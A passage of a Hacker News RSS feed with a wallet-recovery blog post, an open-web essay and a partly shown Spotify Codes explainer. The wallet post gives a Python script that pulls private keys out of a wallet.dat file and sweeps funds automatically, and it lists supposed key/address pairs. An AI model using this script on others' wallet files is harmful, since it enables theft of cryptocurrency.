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"></p></div> </article></div></div></div>]]>
            </description>
            <link>https://historycollection.com/conspiracy-8-far-fetched-theories-turned-true/7/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25156405</guid>
            <pubDate>Fri, 20 Nov 2020 01:16:33 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Corrupted Bitcoin Wallet and 30 Lines of Code = 3000 USD]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25156310">thread link</a>) | @kewde__
<br/>
November 19, 2020 | https://kewde.github.io/corrupted-bitcoin-wallet | <a href="https://web.archive.org/web/*/https://kewde.github.io/corrupted-bitcoin-wallet">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

<p>A friend of a relative had brought in their Macbook Air, and kindly asked me to repair it.
This required me to download the latest MacOS for which I didnâ€™t have enough space for.
In a desperate attempt, I decided to clean up my external hard drive, removing files that were taking up too much storage.</p>

<p>This is the exact moment that karma had found its way to my 4 AM adventure to fix this MacBook.</p>

<p>To my surprise I found a folder named â€œBtcâ€, where I stored episode of television shows. 
Apparently it has been there since 2015 - this must have been my very first wallet!</p>

<p>Sadly, the wallet wouldnâ€™t open in bitcoin core, it has been corrupted.
The <code>db.log</code> outputs the logs for the BerkeleyDB wallet file, it indicated the following error message:</p>
<pre><code>file wallet.dat has LSN 780/2077553, past end of log at 1/333
Commonly caused by moving a database from one database environment
to another without clearing the database LSNs, or by removing all of
the log files from a database environment
DB_ENV-&gt;log_flush: LSN of 780/2077553 past current end-of-log of 1/333
Database environment corrupt; the wrong log files may have been removed or incompatible database files imported from another environment
</code></pre>

<p>Therefore I was forced to salvage the wallet somehow.
The <code>Bitcoin Core</code> software has an option <code>-salvagewallet</code> which did not appear to help.</p>

<p>A bit of googling around and I found out that uncompressed private keys are prepended with <code>01 01 04 20</code>.
Time to take a quick scroll through the file in <code>HxD</code>, a popular hex editor!</p>

<p><img src="https://kewde.github.io/res/corrupted-bitcoin-wallet/HxD-search.png" alt=""></p>

<p><img src="https://kewde.github.io/res/corrupted-bitcoin-wallet/HxD-search-2.png" alt=""></p>

<p>I didnâ€™t expect to get 145 hits, but what I certainly didnâ€™t want to do was manually converting all of those hits to private keys and checking the balance.</p>

<p><img src="https://kewde.github.io/res/corrupted-bitcoin-wallet/HxD-search-3.png" alt=""></p>

<p>The private key is 32 bytes long and is just after our prefix.</p>
<pre><code>ffb2b2ed484fa1d5c9b2f4ad8e7ec696
</code></pre>

<p>So I got to work, the result is below.</p>


<pre><code>pip install bit
</code></pre>

<p>Take the code below and put in a file named <code>salvage.py</code>
<strong>Do not forget to uncomment and change the address variable on line 7</strong>.</p>

<p>Finally, run the script!</p>
<pre><code>python salvage.py
</code></pre>

<p>It will output something like this, and if it finds funds, will automatically transfer them over to the address your specified.
PS: do not post this publicly, the first string is the <code>private key</code>, followed by the <code>address</code> and finally the <code>amount of btc</code>.</p>
<pre><code>91236845f793a1aabd01c1d9fe615b8b 14uxHyEs1rKcPTYxnxMFW9soVTgvQsGvZq 0
323a961695929abf201386aaf2187e1 1tEiRCzpR4fKzvTejZV3MJhymx1iDmHNd 0
f94048834d85608f3a822aa84799fb8f 1JgH79RGzm9QwbYKU8LSs1hiDHsNdvrhR 0
365480736196084e8d6c7bf7b5a5943d 16CUqJjUEpkE7n34UKjTGBn5ZWAC1EGbep 0
636c0638ff10d8d19e9f36b5bed1e06 1MefrcgGg8cuSRSFbjxBwMsid6FAXf2FNb 0
aba4471c95f8217c3bbfdfddde4e17c0 1GfuKWVfk9jcu9hoNekP8DxCu2AUvDWsH3 0
a46802436a1722a0494ea88c391e2358 1CZ1LepDyk4rbD9tbYpUW1fpCJfjGuWb9J 0
23cf4f0d928d0cbcb3791ff659d81ed7 1KvCXp43MxHZGA1uAZeL1qEww8Zvx7syHd 0
d9310b543473af26aaab9e7400b4070 1B1z1GDyUPCg63NwPr4JRNg9omrHnmtcgW 0
b19a010122ce93ced3f5889109e5af99 1HDs9h8SwZn95kBTU3VWZqRfcs1ZBUe8de 0
12fd6615262cb26dc7ef8b1b7be27b8f 1E3HW9Bb6GiD9d79oJsMZB52j9dXshmhzv 0
19cad87841864304a23812a893c8dfe0 18gxN33f8KYGWH9NxrJo1FBkAVq4L2im9B 0
2ede1602dc2a0574c72342362a2c446c 1C4hCdQhy1yEvRWv2qNVJkNmz61bfCPNAZ 0
a3b68584e2d9350e349a29afa555cf2b 16icLfzH2JPrzWEyNzw8Y7FRR2uUH68fG2 0
8f9fa69c9c4098ed98c7ec805131fd4f 1CZfJ3gfvfwPcfesKPxCTJo6PGAw5a4wFS 0
2d022112ea9d6710d08fcb4c695af606 1BSuQypnh14EFhZfqRVN9djjsU7yKSuEhQ 0
da406f8761d993d7138ee75b10e7600b 1LxAr1SBFmbQZacinq5qZhPSghM1Ncq33W 0
8ac6891b9ad67f860e258e82fe24aeaa 18UCnSmxLkjx6vQWULzEVX3wDyEojiFybr 0
54a005c84d9653e19771494c82360861 18VUZhJu5nSuP8ovJDejaVTrYZLaSL4q68 0
9c71627b14ac35b7a0b26dd316c4a324 1HyHdi6suCYDxMPo4vwio55KksHz34Pok4 0
daa514c0f215cb9ac314e47c214be022 1PNMuWtNoi5qdkNRW7P8Wg8b4SBuQxheiZ 0
c0292135b0df7fe7c11d2a76c3ae288b 1F4fEjExUneyDZxjHqRWofpBDf8yTiPyeJ 0
9baf68164b9b14dc1c9c10e49639fcfc 1BrKyAzwTBdVhjZgK4xqi7ZUMWKSD9jdSs 0
7f28390b03957683423956ad890bd0d8 1MbQauBHGR1JWeo9UdP49xaqYVcFP73Fw9 0
</code></pre>


<pre><code>from bit import Key
from bit.format import bytes_to_wif
import re

wallet_file = "wallet.dat"
# Uncomment for security, set the address and uncomment.
#address = "ADDRESS_TO_SEND_TO"

def salvage(priv):
    key = Key.from_hex(priv)
    wif = bytes_to_wif(key.to_bytes(), compressed=False)
    key = Key(wif)
    print(priv + " " + key.address + " " + str(key.get_balance('btc')))
    if (float(key.get_balance('btc')) &gt; 0):
        tx = key.send([], leftover=address)
    return key

with open(wallet_file, "rb") as f:
    matches = re.findall(b'\x01\x01\x04\x20(.{32})', f.read())

for priv in matches:
    salvage(priv.hex())
</code></pre>


<p>In retrospect, I couldâ€™ve used PyWallet but I decided not to.</p>

<h2 id="stricter-validation">Stricter validation</h2>
<p>The PyWallet implementation does a lot more checks before it decides that a key is â€œvalidâ€.
It seems to be using a concept of both â€œprefixesâ€ and â€œsuffixesâ€ for the keys.
Additionally the prefix used in <code>PyWallet</code> is a lot larger, <code>308201130201010420</code> instead of <code>01010420</code>.
If by any chance a single character of the prefix and/or suffix get corrupted, it will not detect it as a key.
My approach is more aggressive in the sense that it will attempt anything that might look like a key.</p>

<h2 id="unencrypted-wallet">Unencrypted wallet</h2>
<p>Additionally, my wallet was not encrypted, therefore it was a bit overkill to use PyWallet.</p>

<h2 id="the-real-reason">The real reason</h2>
<p>I was ony my Windows machine and I didnâ€™t feel like spending an hour to install dependencies like <code>python-twisted</code>, when I could get the job done with less code.</p>

<p>Nonetheless, PyWallet is a great tool and it is worth using for encrypted wallets.</p>
</div></div>]]>
            </description>
            <link>https://kewde.github.io/corrupted-bitcoin-wallet</link>
            <guid isPermaLink="false">hacker-news-small-sites-25156310</guid>
            <pubDate>Fri, 20 Nov 2020 01:02:22 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How user experience degrades as the open web dies]]>
            </title>
            <description>
<![CDATA[
Score 6 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25156304">thread link</a>) | @abhinavsharma
<br/>
November 19, 2020 | https://insightbrowser.com/blog/open-web-dying-why-care | <a href="https://web.archive.org/web/*/https://insightbrowser.com/blog/open-web-dying-why-care">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="content"><div><div><p><em>Part 1: How your user experience changes for the worse as the open web gives way to walled gardens</em></p><p>I hang out in two circles. Open web enthusiasts that are lamenting its demise, and regular users who are happy with their fast snappy apps and couldn't care less. </p><p>These groups have a hard time talking because the "open web" too often comes across as an idealistic abstract notion and most end users just don't tangibly feel the bad consequences. In fact, they're often happier with the snappy, vertically integrated experience of closed app ecosystems. </p><p>My goal here is to make it more palpable how everyday apps, searches and tools get worse when we let big centralized companies take over the web, and explore some paths for reversing it.</p><h2>What is the the open web?</h2><p>Most definitions of the "open web" I've seen are either too technical to be accessible or too abstract to be usable and getting gridlocked in this debate often means watching from the sidelines while actual user welfare slowly diminishes.</p><p>Three characteristics that proponents of the open web will agree to in roughly descending order are:</p><ul><li><strong>Ease of publishing</strong>: anyone can publish to it freely or at least very cheaply, and is on the same footing with a globally accessible URL</li><li><strong>Ease of consuming</strong>: Net neutrality â€” ISP's dont cut deals with corporations to make some websites load faster or cheaper than others.</li><li><strong>Ease of remixing</strong>. You can see the source code. Content licenses and tools are permissive for derived works.</li></ul><h2>Detour: A framework to break down how people use the web</h2><p>I want to focus on the user experience point of view. To do this, I'm going to introduce a framework that divides up all our internet usage into two categories.</p><p><img src="https://landen.imgix.net/blog_uSsTzKptQlxlvUvQ/assets/xscGdbWOOPkGjdER.png" alt="Frame 1.png"></p><h3><strong>Unfamiliar problems</strong></h3><p>You have an unfamiliar problem and to solve it you either need to learn something new, or purchase goods or services to solve it</p><ul><li>e.g. taking out a mortgage, a health problem in the family, where to go to college, what skill to acquire next.</li><li>Unfamiliar problems are solved in large part with acquiring new knowledge, not just products or services.</li><li>These user journeys start with search engines â€” Google predominantly and **a lot of the time solving them is spent on web pages**.</li><li>When people are looking to solve unfamiliar problems, **revenue is typically higher-margin**, because users can't price the products and services as well.</li><li>These ultimately transition to being familiar problems.</li></ul><h3><strong>Familiar problems</strong></h3><ul><li>e.g. being entertained, keeping the dog food in stock,</li><li>These are best solved with apps like Email, Netflix, Twitter, DTC subscription boxes, etc.</li><li>Solving these needs has a very well defined user interaction journey. You open the app you're familiar with and follow its standard flow.</li><li>Revenue from people solving familiar problems is typically lower-margin and there's more competing products.
</li></ul><h3>How we're spending our time on familiar vs. unfamiliar problems</h3><p>Using time spent in apps vs mobile web on mobile is a way to proxy how we divide up our time.<strong> We spend most of our time on familiar problems but have a constant trickle of unfamiliar problems</strong>.</p><p><img src="https://landen.imgix.net/blog_uSsTzKptQlxlvUvQ/assets/cPuXkKFELALeIAkI.png" alt="Untitled (1).png"></p><h2>Unfamiliar problems are better solved with the open web</h2><p>Think about the last time you did some research, e.g. choosing a phone plan. You asked your friends, compared on forums, looked at the official sites, scribbled some notes and made a decision. Even if this journey was quick, you likely traversed a dozen services and products to do this.</p><p>Unfamiliar problems have less constraints, require creativity to solve, and thus are better suited to open solutions. Some other things that work for the open web here</p><ul><li>comparing alternatives is easier.</li><li>changing modalities (e.g. from reading to video) is easier.</li></ul><h2>Familiar problems stand to benefit more from tight vertical integration</h2><p>Take Spotify for example. It solves the very familiar problem of listening to music. Spotify just works better as an app because</p><ul><li>Controlling the user experience end to end makes for smoother flows.</li><li>Having all the user data kept with Spotify allows for better recommendation algorithms.</li><li>Spotify can easily hand off between devices.</li><li>It can run in the background</li></ul><p>Sure, the web can do a bunch of these things, but they're simply not first-class considerations in the open-read-close workflow that the browser was designed for.</p><h2>But the open web can be better for familiar problems too, especially for breaking monopolies</h2><p>Let's look at Amazon. Initially you start buying there because of their "always low prices" and the convenience of 2 day shipping. Over the years you keep shopping there, until you've forgotten that </p><ol><li>free 2 day shipping is now near universal</li><li>amazon isn't often the cheapest place</li></ol><p>On the Amazon app, you see the story around the product that best serves Amazon, not the buyer. Meanwhile, over on Insight you can use the web version and do all these things the app can't.</p><p><img src="https://landen.imgix.net/blog_uSsTzKptQlxlvUvQ/assets/ZEblynrLvBsutnlQ.png" alt="Screen Shot 2020-11-17 at 5.42.21 PM.png"></p><p>... and not just that

</p><p><img src="https://landen.imgix.net/blog_uSsTzKptQlxlvUvQ/assets/JVZoTRazmYPZXBQQ.png" alt="Screen Shot 2020-11-17 at 5.59.22 PM.png"></p><h2><strong>How solving unfamiliar problems gets harder too</strong></h2><p>Unfamiliar problems are solved in large part with acquiring new knowledge, not just products or services. The incentives to freely create knowledge that solves unfamiliar problems is lost as the web closes down.</p><ul><li>Google increasingly takes a larger percent of ad revenue as they <a href="https://sparktoro.com/blog/less-than-half-of-google-searches-now-result-in-a-click/">start extracting answers from pages and showing them on their search result pages.</a><a href="https://sparktoro.com/blog/less-than-half-of-google-searches-now-result-in-a-click/"></a></li><li><a href="https://sparktoro.com/blog/less-than-half-of-google-searches-now-result-in-a-click/"></a>Publishers have to either a) paywall their content (e.g. NYTimes) or b) subtly sell products (everyone standing a Wirecutter alternative), or c) ask for donations in order to survive.</li><li>Only a few big name publishers survive. Google and Facebook start sending them more of the traffic that's left, and since domain rank plays a big part in Google's ranking, those that survived assimilate more power and rank better.</li><li>and search engines seem more littered with SEO junk and less actually useful information year over year.</li></ul><h2>In conclusion, and where we fit in.</h2><p>And that's how your user experience slowly degrades, and that's why we stand to suffer as users if we give up the ability to remix software that the web brought us and closed apps are now taking away. </p><p>Our goal with Insight is to give the web (in particular on mobile) a fighting chance by exhibiting how it can be more powerful than a closed ecosystem and give more control to the end-user. We do this by showcasing the web's infinite extensibility and customizability for common use cases like <a href="http://insightbrowser.com/collections/search">search</a>, <a href="https://insightbrowser.com/collections/shopping">shopping</a>, <a href="https://insightbrowser.com/collections/reading">reading</a> and <a href="https://insightbrowser.com/collections/cooking">cooking</a>.</p><p>Insight's advanced features will soon only be available to Pro subscription users but for a limited time we're opening up <strong>lifetime free beta access if you download it via TestFlight below.</strong></p><h3>Coming up in part 2</h3><ul><li>What parts of the open web probably should die off?</li><li>A pragmatic path for what's left of the open web to thrive again.</li></ul><p>We'd love to hear from you, feel free to tweet at or DM us at @<a href="https://twitter.com/insightbrowser">insightbrowser</a> </p></div></div></div></div>]]>
            </description>
            <link>https://insightbrowser.com/blog/open-web-dying-why-care</link>
            <guid isPermaLink="false">hacker-news-small-sites-25156304</guid>
            <pubDate>Fri, 20 Nov 2020 01:01:39 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How do Spotify Codes work?]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25156104">thread link</a>) | @Mistri
<br/>
November 19, 2020 | https://boonepeter.github.io/posts/2020-11-10-spotify-codes/ | <a href="https://web.archive.org/web/*/https://boonepeter.github.io/posts/2020-11-10-spotify-codes/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><article><div><p><img src="https://boonepeter.github.io/imgs/spotify/spotify_track_6vQN2a9QSgWcm74KEZYfDL.jpg" alt="Spotify barcode"></p><p><a href="https://www.spotifycodes.com/">Spotify Codes</a> are QR-like codes that can be generated to easily share Spotify songs, artists, playlists, and users. I set out to figure out how they worked, which lead me on a winding journey through barcode history, patents, packet sniffing, error correction, and Gray tables.</p><h2 id="spotify-uris">Spotify URIs</h2><p>Letâ€™s start with Spotify URIs (Uniform Resource Identifiers). Different pieces of media (artists, albums, songs, playlists, users) all have a URI.</p><p>The ABBA song â€œTake a Chance on Meâ€ has this URI:</p><p><code>spotify:track:6vQN2a9QSgWcm74KEZYfDL</code>.</p><p>The ABBA Album â€œThe Albumâ€ has the following URI:</p><p><code>spotify:album:5GwbPSgiTECzQiE6u7s0ZN</code></p><p>As you can see, the URIs can be broken up into components:</p><p><code>spotify:&lt;media type&gt;:&lt;22 characters&gt;</code>.</p><p>The 22 characters are the numbers 0-9, characters a-z and A-Z. This means there are <code>10 + 26 + 26 = 62</code> possibilities for each character (almost <a href="https://en.wikipedia.org/wiki/Base64">Base64</a>). So the potential number of Spotify URIs is <code>62^22</code> which is equal to <code>2.7e39</code> or</p><div><pre><code data-lang="python"><span>2</span>,<span>707</span>,<span>803</span>,<span>647</span>,<span>802</span>,<span>660</span>,<span>400</span>,<span>290</span>,<span>261</span>,<span>537</span>,<span>185</span>,<span>326</span>,<span>956</span>,<span>544</span>
</code></pre></div><p>To illustrate that number:</p><div><pre><code data-lang="python">x <span>=</span> <span>62</span> <span>**</span> <span>22</span>
<span># the number of milliseconds in a year</span>
x <span>//=</span> <span>365</span> <span>*</span> <span>24</span> <span>*</span> <span>60</span> <span>*</span> <span>60</span> <span>*</span> <span>1000</span>
<span># the number of words in the bible (about 1 million)</span>
x <span>//=</span> <span>1000000</span>
</code></pre></div><p>If Spotify printed a whole Bibleâ€™s worth of URIs every millisecond they could do this for <code>85,863,890,404,701,306,452,633</code> years. Safe to say Spotify is not going to run out of URIs anytime soon.</p><h2 id="barcode-background">Barcode background</h2><p>The <a href="https://en.wikipedia.org/wiki/Barcode">history of barcodes</a> is quite extensive. Information is encoded into different barcodes in a variety of ways.</p><p>A lot of barcodes encode data in the <strong>widths</strong> of vertical bars. Universal product codes (UPCs) encode 12 digits using combinations of vertical bars of different widths:</p><p><img src="https://boonepeter.github.io/imgs/spotify/upc.png" alt="UPC encodings"></p><p><a href="https://en.wikipedia.org/wiki/KarTrak">Another barcode</a> uses colors to encode data:</p><p><img src="https://boonepeter.github.io/imgs/spotify/KarTrak_ACI_codes.svg.png" alt="Kartrack barcode"></p><p><a href="https://en.wikipedia.org/wiki/QR_code">QR codes</a> use a 2d matrix of dots to encode data.</p><p><img src="https://boonepeter.github.io/imgs/spotify/qr_code.png" alt="QR code"></p><p>A lot of mail barcodes encode data using the <strong>height</strong> of the bars (like the <a href="https://en.wikipedia.org/wiki/Intelligent_Mail_barcode">Intelligent Mail barcode</a>).</p><p><img src="https://boonepeter.github.io/imgs/spotify/intelligent_mail_barcode.png" alt="Intelligent mail barcode"></p><h2 id="spotify-codes">Spotify Codes</h2><p>Spotify codes work like the <a href="https://en.wikipedia.org/wiki/Intelligent_Mail_barcode">Intelligent Mail Barcode</a>. Information can be stored in the bars by setting them to different heights.</p><p>This is the Spotify code for the ABBA song â€œTake a Chance on Meâ€:</p><p><img src="https://boonepeter.github.io/imgs/spotify/spotify_track_6vQN2a9QSgWcm74KEZYfDL.jpg" alt="Spotify barcode"></p><p>When the bars are sorted by height you can see that there are 8 discrete heights that they fall into.</p><p><img src="https://boonepeter.github.io/imgs/spotify/sorted.png" alt="Spotify sorted barcodes"></p><p>This means the data is encoded in <a href="https://en.wikipedia.org/wiki/Octal">octal</a>.</p><p>The Spotify logoâ€™s diameter is the same as the height of the highest bar. This makes it easy to generate ratios of the bars' heights.</p><p>In this function I use <a href="https://scikit-image.org/">scikit-image</a> to calculate the sequence of bar heights from a logo.</p><div><pre><code data-lang="python"><span>from</span> skimage <span>import</span> io
<span>from</span> skimage.measure <span>import</span> label, regionprops
<span>from</span> skimage.filters <span>import</span> threshold_otsu
<span>from</span> skimage.color <span>import</span> rgb2gray


<span>def</span> <span>get_heights</span>(filename: str) <span>-&gt;</span> list:
    <span>"""Open an image and return a list of the bar heights.
</span><span>    """</span>
    <span># convert to grayscale, then binary</span>
    image <span>=</span> io<span>.</span>imread(filename)
    im <span>=</span> rgb2gray(image)
    binary_im <span>=</span> im <span>&gt;</span> threshold_otsu(im)

    <span># label connected regions as objects</span>
    labeled <span>=</span> label(binary_im)

    <span># get the dimensions and positions of bounding box around objects</span>
    bar_dimensions <span>=</span> [r<span>.</span>bbox <span>for</span> r <span>in</span> regionprops(labeled)]

    <span># sort by X</span>
    bar_dimensions<span>.</span>sort(key<span>=</span><span>lambda</span> x: x[<span>1</span>], reverse<span>=</span>False)

    <span># the first object (spotify logo) is the max height of the bars</span>
    logo <span>=</span> bar_dimensions[<span>0</span>]
    max_height <span>=</span> logo[<span>2</span>] <span>-</span> logo[<span>0</span>]
    sequence <span>=</span> []
    <span>for</span> bar <span>in</span> bar_dimensions[<span>1</span>:]:
        height <span>=</span> bar[<span>2</span>] <span>-</span> bar[<span>0</span>]
        ratio <span>=</span> height <span>/</span> max_height
        <span># multiply by 8 to get an octal integer</span>
        ratio <span>*=</span> <span>8</span>
        ratio <span>//=</span> <span>1</span>
        <span># convert to integer (and make 0 based)</span>
        sequence<span>.</span>append(int(ratio <span>-</span> <span>1</span>))
    <span>return</span> sequence
</code></pre></div><p>This is the sequence of the â€œTake On Meâ€ Spotify code:</p><div><pre><code data-lang="python"><span>&gt;&gt;&gt;</span> get_heights(<span>"/imgs/spotify/spotify_track_6vQN2a9QSgWcm74KEZYfDL.jpg"</span>)
[<span>0</span>, <span>5</span>, <span>1</span>, <span>2</span>, <span>0</span>, <span>6</span>, <span>4</span>, <span>3</span>, <span>7</span>, <span>1</span>, <span>6</span>, <span>7</span>, <span>7</span>, <span>7</span>, <span>7</span>, <span>3</span>, <span>1</span>, <span>6</span>, <span>3</span>, <span>7</span>, <span>0</span>, <span>7</span>, <span>0</span>]
</code></pre></div><p>Here are those results overlaid on the barcode:</p><p><img src="https://boonepeter.github.io/imgs/spotify/spotify_labeled.png" alt="labeled spotify code"></p><p>After looking at a few barcodes, I realized that the first and last bars are always 0, and the 12th bar is always a 7. This must help in identifying if the barcode is valid. Having the 12th bar as the max height also helps you calculate the ratios of the bar heights. I suspect setting the first and last bar set to 0 is an aesthetic choice: it makes the barcode look more like a sound wave. Here are a few barcodes printed out so you can see that the first and last are always equal to 0 and the 12th is equal to 7.</p><div><pre><code data-lang="python">    [<span>0</span>, <span>3</span>, <span>3</span>, <span>0</span>, <span>5</span>, <span>2</span>, <span>2</span>, <span>2</span>, <span>2</span>, <span>5</span>, <span>1</span>, <span>7</span>, <span>0</span>, <span>0</span>, <span>5</span>, <span>6</span>, <span>0</span>, <span>7</span>, <span>7</span>, <span>7</span>, <span>1</span>, <span>5</span>, <span>0</span>]
    [<span>0</span>, <span>5</span>, <span>6</span>, <span>5</span>, <span>3</span>, <span>5</span>, <span>4</span>, <span>2</span>, <span>7</span>, <span>2</span>, <span>5</span>, <span>7</span>, <span>1</span>, <span>3</span>, <span>1</span>, <span>1</span>, <span>6</span>, <span>1</span>, <span>1</span>, <span>6</span>, <span>7</span>, <span>6</span>, <span>0</span>]
    [<span>0</span>, <span>4</span>, <span>6</span>, <span>6</span>, <span>6</span>, <span>4</span>, <span>4</span>, <span>1</span>, <span>6</span>, <span>6</span>, <span>6</span>, <span>7</span>, <span>7</span>, <span>3</span>, <span>6</span>, <span>0</span>, <span>7</span>, <span>6</span>, <span>0</span>, <span>2</span>, <span>1</span>, <span>7</span>, <span>0</span>]
    [<span>0</span>, <span>0</span>, <span>3</span>, <span>3</span>, <span>7</span>, <span>5</span>, <span>2</span>, <span>3</span>, <span>1</span>, <span>1</span>, <span>4</span>, <span>7</span>, <span>5</span>, <span>5</span>, <span>5</span>, <span>3</span>, <span>3</span>, <span>7</span>, <span>5</span>, <span>1</span>, <span>4</span>, <span>3</span>, <span>0</span>]
    [<span>0</span>, <span>6</span>, <span>2</span>, <span>2</span>, <span>1</span>, <span>5</span>, <span>2</span>, <span>6</span>, <span>2</span>, <span>2</span>, <span>3</span>, <span>7</span>, <span>7</span>, <span>6</span>, <span>6</span>, <span>4</span>, <span>5</span>, <span>6</span>, <span>0</span>, <span>1</span>, <span>4</span>, <span>3</span>, <span>0</span>]
    [<span>0</span>, <span>7</span>, <span>7</span>, <span>1</span>, <span>4</span>, <span>7</span>, <span>1</span>, <span>0</span>, <span>4</span>, <span>7</span>, <span>1</span>, <span>7</span>, <span>6</span>, <span>5</span>, <span>6</span>, <span>3</span>, <span>1</span>, <span>6</span>, <span>4</span>, <span>4</span>, <span>7</span>, <span>7</span>, <span>0</span>]
    [<span>0</span>, <span>1</span>, <span>1</span>, <span>1</span>, <span>5</span>, <span>7</span>, <span>1</span>, <span>3</span>, <span>3</span>, <span>1</span>, <span>0</span>, <span>7</span>, <span>7</span>, <span>0</span>, <span>7</span>, <span>3</span>, <span>2</span>, <span>3</span>, <span>0</span>, <span>6</span>, <span>0</span>, <span>0</span>, <span>0</span>]
    [<span>0</span>, <span>7</span>, <span>6</span>, <span>6</span>, <span>7</span>, <span>4</span>, <span>4</span>, <span>6</span>, <span>7</span>, <span>0</span>, <span>6</span>, <span>7</span>, <span>0</span>, <span>4</span>, <span>1</span>, <span>7</span>, <span>3</span>, <span>2</span>, <span>0</span>, <span>5</span>, <span>4</span>, <span>7</span>, <span>0</span>]
    [<span>0</span>, <span>0</span>, <span>0</span>, <span>6</span>, <span>1</span>, <span>3</span>, <span>3</span>, <span>2</span>, <span>2</span>, <span>0</span>, <span>2</span>, <span>7</span>, <span>3</span>, <span>2</span>, <span>4</span>, <span>1</span>, <span>6</span>, <span>0</span>, <span>1</span>, <span>5</span>, <span>0</span>, <span>4</span>, <span>0</span>]
